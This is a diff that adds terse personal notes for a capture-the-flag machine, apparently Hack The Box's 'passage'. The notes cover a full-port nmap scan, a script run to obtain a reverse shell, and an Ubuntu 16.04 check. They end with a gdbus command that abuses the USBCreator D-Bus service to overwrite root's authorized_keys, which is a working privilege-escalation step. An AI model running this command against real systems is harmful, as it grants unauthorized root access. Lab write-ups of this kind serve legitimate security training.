@@ -1,0 +1,11 @@
+nmap -sVTC passage.htb -Pn -p 1-65535
+python3 cutnew.py
+###get revershell
+
+
+check ever file until find b0.php
+lsb_release -a
+Ubuntu 16.04.6 LTS
+escalation
+###Be careful past is   /home/nadav/authorized_keys
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/authorized_keys /root/.ssh/authorized_keys true
